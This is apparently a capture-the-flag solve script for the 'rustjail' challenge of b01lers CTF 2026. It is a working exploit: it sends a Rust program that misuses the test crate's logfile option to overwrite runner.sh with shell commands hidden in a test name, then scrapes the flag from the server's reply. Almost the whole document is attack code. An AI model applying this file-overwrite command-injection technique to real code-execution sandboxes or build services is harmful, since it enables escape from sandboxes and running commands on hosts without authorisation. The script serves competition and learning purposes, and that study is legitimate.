#!/usr/bin/env python3
"""
b01lers CTF 2026 - rustjail solve script
Exploits test crate logfile to overwrite runner.sh and inject shell commands.
"""
import socket
import ssl
import time
import sys

HOST = "rustjail.opus4-7.b01le.rs"
PORT = 8443

PAYLOAD = r'''#![feature(test)]
extern crate test;
fn main() {
    let name = format!("{}\necho XYZZY42\npwd\nls\ncat f*\n", "A".repeat(349));
    let td = test::TestDescAndFn {
        desc: test::TestDesc {
            name: test::DynTestName(name),
            ignore: false,
            ignore_message: None,
            source_file: "",
            start_line: 0,
            start_col: 0,
            end_line: 0,
            end_col: 0,
            should_panic: test::ShouldPanic::No,
            compile_fail: false,
            no_run: false,
            test_type: test::TestType::Unknown,
        },
        testfn: test::DynTestFn(Box::new(|| { Ok(()) })),
    };
    let args = vec!["t".to_string(), "--logfile".to_string(), "runner.sh".to_string()];
    test::test_main(&args, vec![td], None);
}
'''


def solve():
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT

    ctx = ssl.create_default_context()
    with socket.create_connection((host, port), timeout=15) as sck:
        with ctx.wrap_socket(sck, server_hostname=host) as ss:
            ss.settimeout(5)

            # Wait for banner / prompt
            buf = b""
            start = time.time()
            while time.time() - start < 20:
                try:
                    c = ss.recv(4096)
                    if not c:
                        break
                    buf += c
                    if b"three newlines in a row" in buf:
                        break
                except (TimeoutError, socket.timeout):
                    continue

            print("[*] Got prompt, sending payload...")
            # Payload terminated by 3 blank lines
            ss.sendall((PAYLOAD + "\n\n\n\n").encode())

            # Read all output
            out = b""
            start = time.time()
            while time.time() - start < 120:
                try:
                    c = ss.recv(4096)
                    if not c:
                        break
                    out += c
                except (TimeoutError, socket.timeout):
                    continue

            result = out.decode("utf-8", "replace")
            print(result)

            # Extract flag
            for line in result.split("\n"):
                line = line.strip()
                if line.startswith("bctf{"):
                    print(f"\n[+] FLAG: {line}")
                    return line

    print("[-] Flag not found")
    return None


if __name__ == "__main__":
    solve()
